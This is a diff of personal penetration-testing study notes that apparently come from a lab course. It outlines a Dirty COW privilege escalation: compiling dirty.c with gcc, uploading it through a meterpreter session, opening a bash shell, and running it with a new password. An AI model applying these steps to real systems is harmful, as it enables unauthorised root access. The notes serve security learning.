@@ -247,10 +247,26 @@ verify exploit code to ensure that it is not doing anything malicious
 ![[Pasted image 20230712152115.png]]
 download ![[Pasted image 20230712152149.png]]
 to run C you need to install package: sudo apt-get install gcc 
-
+![[Pasted image 20230712175057.png]]
 - navigate to the exploit file on your kali 
 - rename the file to dirty.c: mv filename dirty.c 
-- run gcc command 
+- run gcc command (see exploit-db for command to compile)
+- terminate channel 
+
+- go back to meterpreter
+	- upload ~/Downloads/dirty 
+	- open een shell session 
+	- bin bash -i 
+	- chmod +x dirty 
+	- ./dirty password123
+	- when it is not compiled on the system you will get error messages 
+	- remove the dirty file (rm) and go back to meterpreter session 
+		- upload ~/Download/dirty.c 
+		- /bin/bash -i (open shell)
+		- run gcc command
+		- chmod +x dirty
+		- ./dirty password123 
+		- 
 
 
 
